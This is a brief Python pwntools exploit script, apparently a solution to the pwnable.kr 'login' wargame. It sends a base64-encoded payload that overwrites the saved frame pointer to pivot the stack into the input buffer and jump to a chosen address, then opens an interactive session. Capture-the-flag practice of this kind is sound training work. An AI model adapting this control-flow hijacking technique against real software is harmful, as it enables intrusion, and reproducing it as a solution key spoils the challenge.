from pwn import*

#p = process('./login')
p = remote('pwnable.kr' ,9003)
correct = 0x08049284
input_addr = 0x0811EB40

# exploit 
pay = ''
pay += 'a'*4		# dummy
pay += p32(correct)	# eip
pay += p32(input_addr)	# mov esp, ebp
p.sendline(b64e(pay))

p.interactive()
